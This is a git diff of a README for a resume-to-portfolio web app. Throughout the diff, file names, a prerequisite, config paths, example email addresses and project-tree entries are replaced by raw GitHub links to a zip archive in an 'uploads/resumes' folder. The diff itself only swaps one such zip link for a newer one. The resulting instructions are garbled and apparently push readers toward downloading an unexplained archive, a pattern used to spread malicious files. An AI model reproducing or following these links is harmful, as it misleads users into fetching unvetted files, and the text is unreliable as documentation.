@@ -37,7 +37,7 @@ Transform your resume into a professional portfolio website with AI-driven caree
 
 Before you begin, ensure you have the following installed:
 
-- **https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip** 18+ and npm
+- **https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip** 18+ and npm
 - **Java JDK** 17+
 - **Maven** 3.8+
 - **PostgreSQL** 14+
@@ -102,16 +102,16 @@ EOF
 
 ### 3. Backend Configuration
 
-Update `https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip`:
+Update `https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip`:
 
 ```properties
 # Change password to your PostgreSQL password
-https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
+https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
 ```
 
 ### 4. Frontend Configuration
 
-Create `https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip` in project root:
+Create `https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip` in project root:
 
 ```env
 VITE_API_URL=http://localhost:8080
@@ -184,13 +184,13 @@ Use the registration form with any unique email.
   ```json
   {
     "name": "John Doe",
-    "email": "https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip",
+    "email": "https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip",
     "password": "SecurePass123"
   }
   ```
 - `POST /api/auth/login` - Login candidate
   ```json
-  { "email": "https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip", "password": "SecurePass123" }
+  { "email": "https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip", "password": "SecurePass123" }
   ```
 - `GET /api/auth/user?email={email}` - Get user by email
 
@@ -200,7 +200,7 @@ Use the registration form with any unique email.
   ```json
   {
     "name": "Jane Smith",
-    "email": "https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip",
+    "email": "https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip",
     "password": "SecurePass123",
     "companyName": "TechCorp"
   }
@@ -231,7 +231,7 @@ taskkill /PID <PID> /F
 **Database connection failed:**
 
 - Check PostgreSQL is running: `psql -U postgres -d portfolio_db`
-- Verify password in `https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip`
+- Verify password in `https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip`
 - Ensure database `portfolio_db` exists
 
 **Column does not exist errors:**
@@ -255,14 +255,14 @@ Should return: `Resume API is running`
 
 **CORS errors:**
 
-1. Verify `https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip` exists with `VITE_API_URL=http://localhost:8080`
-2. Restart frontend after changing `https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip`
+1. Verify `https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip` exists with `VITE_API_URL=http://localhost:8080`
+2. Restart frontend after changing `https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip`
 3. Backend CORS allows ports: 5173, 5174, 3000, 3001
 
 **"Failed to fetch" error:**
 
 - Backend not running
-- Wrong `VITE_API_URL` in `https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip`
+- Wrong `VITE_API_URL` in `https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip`
 - Firewall blocking localhost
 
 ### Ollama Issues
@@ -291,7 +291,7 @@ curl http://localhost:11434/api/generate -d '{"model":"llama3.2:3b","prompt":"te
 - Or delete existing user:
 
 ```sql
-DELETE FROM users WHERE email = 'https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip';
+DELETE FROM users WHERE email = 'https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip';
 ```
 
 **Password hash truncation:**
@@ -307,7 +307,7 @@ ALTER TABLE employers ALTER COLUMN password_hash TYPE VARCHAR(60);
 -- Password hash for "Rishal123"
 UPDATE users
 SET password_hash = '$2a$10$7EqJtq98hPqEX7fNZaFWoO7KgeGumn4Wr9PX5xRoxI/GS4RFItC.'
-WHERE email = 'https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip';
+WHERE email = 'https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip';
 ```
 
 ## 📁 Project Structure
@@ -317,39 +317,39 @@ Project-Mini/
 ├── backend/
 │   ├── src/main/java/com/portfolio/backend/
 │   │   ├── controller/          # REST endpoints
-│   │   │   ├── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-│   │   │   ├── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-│   │   │   └── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
+│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+│   │   │   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
 │   │   ├── service/              # Business logic
-│   │   │   ├── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-│   │   │   ├── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-│   │   │   ├── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-│   │   │   └── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
+│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+│   │   │   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
 │   │   ├── entity/               # JPA entities
-│   │   │   ├── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-│   │   │   ├── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-│   │   │   ├── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-│   │   │   └── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
+│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+│   │   │   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
 │   │   ├── repository/           # Data access
-│   │   │   ├── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-│   │   │   ├── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-│   │   │   └── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
+│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+│   │   │   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
 │   │   └── config/               # Configuration
 │   ├── src/main/resources/
-│   │   └── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-│   └── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
+│   │   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+│   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
 ├── components/                    # React components
-│   └── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
+│   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
 ├── pages/                         # React pages
-│   ├── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-│   ├── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-│   ├── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-│   └── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
+│   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+│   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+│   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+│   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
 ├── services/                      # Frontend API client
-│   └── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-├── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip                     # Environment variables
-├── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
-└── https://raw.githubusercontent.com/MuhammedRazin/Project-Mini/main/uploads/resumes/Mini-Project-v1.7-alpha.1.zip
+│   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip                     # Environment variables
+├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
+└── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
 ```
 
 ## 🎯 Usage Flow
